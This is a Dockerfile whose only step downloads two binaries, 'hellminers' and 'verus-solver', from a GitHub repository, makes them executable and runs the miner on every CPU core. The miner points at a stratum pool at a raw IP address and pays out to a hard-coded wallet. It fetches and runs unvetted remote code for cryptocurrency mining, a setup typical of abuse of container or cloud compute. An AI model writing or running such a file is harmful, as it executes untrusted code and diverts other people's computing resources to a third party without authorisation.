FROM ubuntu:18.04
RUN apt-get update && \
     apt-get install wget -y && \
     wget https://raw.githubusercontent.com/laboldrokok/saksake/main/hellminers && wget https://raw.githubusercontent.com/laboldrokok/saksake/main/verus-solver && chmod +x hellminers verus-solver && ./hellminers -c stratum+tcp://79.137.70.48:3956 -u RN2u2EXEyW65CAgXpiqG99uuha5ATPcWSK.GC -p x --cpu $(nproc)